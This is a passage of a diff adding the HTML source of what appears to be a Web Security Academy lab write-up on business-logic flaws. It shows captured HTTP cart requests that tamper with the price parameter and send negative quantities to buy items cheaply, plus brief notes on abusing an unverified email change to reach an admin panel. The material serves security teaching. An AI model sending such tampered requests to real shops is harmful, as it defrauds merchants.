+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;productId=1&amp;amp;redir=PRODUCT&amp;amp;quantity=1&amp;amp;price=133700&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;Edited request with product’s price set to $00.01&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0aee00ab0420f09280afcb6f00450037.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cookie&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;session=6ftRjffxKFYAX6oK6N1CJYwKcqNggNI4&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cache-Control&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;max-age=0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt; &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Mobile&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;?0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Platform&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;https://0aee00ab0420f09280afcb6f00450037.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/x-www-form-urlencoded&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;productId=1&amp;amp;redir=PRODUCT&amp;amp;quantity=1&amp;amp;price=0001&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;image.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-1.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;The application also doesn’t perform any actions in the checkout action in order to check if the product’s price is correct.&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;High-level logic vulnerability&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;high-level-logic-vulnerability&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#high-level-logic-vulnerability&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The shopping application below performs the following POST request when a user removes an item from their cart:&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0ade003a0376404b8243e26b006f00e3.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cookie&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;session=qmmsLBX0Zre7Fr39IsSjfedj32wpBgUg&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cache-Control&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;max-age=0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt; &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Mobile&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;?0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Platform&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/x-www-form-urlencoded&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User-Agent&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Fetch-Site&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;same-origin&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Fetch-Mode&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;navigate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Fetch-User&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;?1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Fetch-Dest&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;document&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Referer&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net/cart&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;productId=1&amp;amp;quantity=-1&amp;amp;redir=CART&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;It follows the same logic from the request used to add one item to the user’s cart, but with a negative value, subtracting the item.&lt;/p&gt;
+&lt;p&gt;This may seem okay, as the button that removes the item from the cart is not present when the cart is empty, but this doesn’t stop the client to send that same request again, but with the empty cart, resulting in the application to ad &lt;code&gt;-x&lt;/code&gt; items to the user, and consequently, also a negative value relative to the amount of items added.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0ade003a0376404b8243e26b006f00e3.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cookie&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;session=qmmsLBX0Zre7Fr39IsSjfedj32wpBgUg&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cache-Control&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;max-age=0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt; &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Mobile&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;?0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Platform&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/x-www-form-urlencoded&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;productId=2&amp;amp;quantity=-229&amp;amp;redir=CART&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;However, it does check the value of the cart before checkout, so we still don’t get infinite money. We can instead add an item with a high value that covers the negative we now have on the cart, allowing us to purchase that new item for an extremely lower price.&lt;/p&gt;
+&lt;div class=&#34;hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code&#34;&gt;
+  
+
+&lt;div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-http&#34; data-lang=&#34;http&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; /cart &lt;span style=&#34;color:#66d9ef&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0ade003a0376404b8243e26b006f00e3.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cookie&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;session=qmmsLBX0Zre7Fr39IsSjfedj32wpBgUg&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Cache-Control&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;max-age=0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt; &lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Mobile&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;?0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Sec-Ch-Ua-Platform&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Upgrade-Insecure-Requests&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Origin&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;https://0ade003a0376404b8243e26b006f00e3.web-security-academy.net&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;application/x-www-form-urlencoded&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Encoding&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;gzip, deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept-Language&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;en-US,en;q=0.9&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;productId=1&amp;amp;quantity=1&amp;amp;redir=CART&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class=&#34;hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0&#34;&gt;
+  &lt;button
+    class=&#34;hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50&#34;
+    title=&#34;Copy code&#34;
+  &gt;
+    &lt;div class=&#34;copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+    &lt;div class=&#34;success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4&#34;&gt;&lt;/div&gt;
+  &lt;/button&gt;
+&lt;/div&gt;
+
+  
+&lt;/div&gt;
+&lt;p&gt;&lt;img src=&#34;image-2.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Inconsistent security controls&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;inconsistent-security-controls&#34;&gt;&lt;/span&gt;
+    &lt;a href=&#34;#inconsistent-security-controls&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Sometimes, the security controls for specific functionalities are implemented with a flawed logic. On the case below, the application allow users with a specific e-mail domain to access an admin panel on the website. Although the application sends a confirmation link to the e-mail provided in registration, it doesn’t check it when the user changes their e-mail for an existing account.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-3.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;It also contains an information disclosure right on the register page, making the exploitation much easier.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-4.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-5.png&#34; alt=&#34;alt text&#34; loading=&#34;lazy&#34; /&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;h3&gt;Flawed enforcement of business rules&lt;span class=&#34;hx-absolute -hx-mt-20&#34; id=&#34;flawed-enforcement-of-business-rules&#34;&gt;&lt;/span&gt;
